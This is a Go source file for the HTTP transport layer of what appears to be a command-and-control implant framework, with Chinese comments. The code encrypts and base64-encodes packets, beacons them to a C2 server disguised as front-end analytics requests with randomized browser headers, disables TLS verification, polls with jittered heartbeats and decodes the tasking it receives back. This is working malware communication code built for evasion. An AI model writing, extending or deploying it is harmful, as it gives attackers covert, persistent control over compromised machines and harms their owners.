package transport

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"time"

	"nautilus/c2/encode"
	"nautilus/evasion"
)

func defaultUA() string {
	switch runtime.GOOS {
	case "windows":
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
	case "linux":
		return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
	case "darwin":
		return "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
	default:
		return "Mozilla/5.0 AppleWebKit/537.36"
	}
}

// HTTPConfig HTTP传输配置
type HTTPConfig struct {
	C2Addr     string
	Path       string
	UserAgent  string
	Interval   int
	Jitter     int
	Headers    map[string]string
	UseSSL     bool
	SkipVerify bool
}

// 随机User-Agent生成
func randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
	}
	rand.Seed(time.Now().UnixNano())
	return uas[rand.Intn(len(uas))]
}

// 随机Referer生成
func randomReferer() string {
	referers := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://www.yahoo.com/",
		"https://www.baidu.com/",
		"https://www.douban.com/",
		"https://www.csdn.net/",
		"https://blog.csdn.net/",
		"https://github.com/",
	}
	rand.Seed(time.Now().UnixNano())
	return referers[rand.Intn(len(referers))]
}

// DefaultConfig 使用普通API路径伪装
func DefaultConfig(addr string) *HTTPConfig {
	return &HTTPConfig{
		C2Addr:    addr,
		Path:      "/api/v1/analytics",
		UserAgent: randomUA(),
		Interval:  5,
		Jitter:    30,
		Headers: map[string]string{
			"Accept":             "application/json, text/plain, */*",
			"Accept-Language":    "zh-CN,zh;q=0.9,en;q=0.8",
			"Accept-Encoding":    "gzip, deflate, br",
			"Cache-Control":      "no-cache",
			"Origin":             "http://localhost:8080",
			"Referer":            randomReferer(),
			"Sec-Ch-Ua":          `"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"`,
			"Sec-Ch-Ua-Mobile":   "?0",
			"Sec-Ch-Ua-Platform": `"Windows"`,
			"Sec-Fetch-Dest":     "empty",
			"Sec-Fetch-Mode":     "cors",
			"Sec-Fetch-Site":     "same-origin",
			"X-Requested-With":   "XMLHttpRequest",
		},
		UseSSL:     false,
		SkipVerify: true,
	}
}

// HTTPTransport HTTP传输层
type HTTPTransport struct {
	config *HTTPConfig
	client *http.Client
}

func NewHTTPTransport(cfg *HTTPConfig) *HTTPTransport {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.SkipVerify},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}
	return &HTTPTransport{config: cfg, client: client}
}

// Send 发送数据包，sid嵌入URL参数避免自定义Header
func (t *HTTPTransport) Send(pkt *encode.Packet, sid string) (*encode.Packet, error) {
	encrypted, err := evasion.AesEncrypt(pkt.Data)
	if err != nil {
		return nil, fmt.Errorf("encrypt failed: %w", err)
	}
	pkt.Data = encrypted

	raw, err := encode.EncodePacket(pkt)
	if err != nil {
		return nil, fmt.Errorf("encode failed: %w", err)
	}

	b64 := evasion.B64Encode(raw)

	// 构建URL: /api/v1/analytics?id=<b64>&sid=<sessionID>
	u, _ := url.Parse(t.config.C2Addr)
	u = u.JoinPath(strings.Trim(t.config.Path, "/"))
	q := u.Query()
	q.Set("id", strings.TrimSpace(b64))
	if sid != "" {
		q.Set("sid", sid)
	}
	u.RawQuery = q.Encode()

	// GET请求 + URL参数 (伪装为前端埋点请求)
	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)
	for k, v := range t.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("c2 returned status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response failed: %w", err)
	}

	// 响应body即为base64编码的任务数据
	decData, err := evasion.B64Decode(strings.TrimSpace(string(body)))
	if err != nil {
		return nil, fmt.Errorf("b64 decode failed: %w", err)
	}

	respPkt, err := encode.DecodePacket(decData)
	if err != nil {
		return nil, fmt.Errorf("decode packet failed: %w", err)
	}

	decrypted, err := evasion.AesDecrypt(respPkt.Data)
	if err != nil {
		return nil, fmt.Errorf("decrypt failed: %w", err)
	}
	respPkt.Data = decrypted

	return respPkt, nil
}

// Poll 轮询C2
func (t *HTTPTransport) Poll(sid string) (*encode.Packet, error) {
	pkt := &encode.Packet{
		Type: encode.MsgHeartbeat,
		Data: []byte{0}, // 非空数据避免AES-GCM空明文问题
	}
	return t.Send(pkt, sid)
}

// GetInterval 获取带抖动的回调间隔
func (t *HTTPTransport) GetInterval() time.Duration {
	base := t.config.Interval
	jitter := t.config.Jitter
	variance := base * jitter / 100
	delay := base + (int(time.Now().UnixNano()) % (2*variance + 1)) - variance
	return time.Duration(delay) * time.Second
}
